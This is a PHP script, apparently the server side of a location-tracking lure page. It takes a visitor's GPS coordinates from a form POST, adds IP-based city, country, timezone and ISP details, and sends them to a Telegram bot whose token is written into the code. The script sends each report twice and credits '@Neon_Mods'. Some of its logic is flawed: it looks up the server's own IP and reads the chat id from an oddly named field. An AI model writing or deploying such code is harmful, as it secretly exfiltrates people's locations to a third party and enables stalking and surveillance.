<?php
$numRequests = 2;
for ($i = 1; $i <= $numRequests; $i++) {
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    
$token = "6528922692:AAGDXmlI5ns4prKGxAPDkUHPkt9JjrnmTvQ";
$chatid = $_POST['6335676956'];

$ip = file_get_contents('https://ipinfo.io/ip');

$url = "http://ip-api.com/json/$ip";
$json = file_get_contents($url);
$data = json_decode($json, true);
$city = $data['city']; 
$country = $data['country']; //End This Point
$asname = $data['asname'];
$currency = $data['currency'];
$org = $data['org'];
$timezone = $data['timezone'];

/*Cod By 

antik 

*/

$message = "🔰 𝐈𝐏 ⭆ $ip %0A🔰𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 ⭆ $city, $country %0A🔰𝐓𝐢𝐦𝐞 𝐙𝐨𝐧𝐞 ⭆ $timezone %0A🔰𝐒𝐢𝐦 𝐓𝐲𝐩𝐞 ⭆ $org%0A%0A🔥 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 : @Neon_Mods";

$send_message = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=$message";

$send_location = "https://api.telegram.org/bot$token/sendLocation?chat_id=$chatid&latitude=$latitude&longitude=$longitude";

file_get_contents($send_message);
file_get_contents($send_location);
 }
}
?>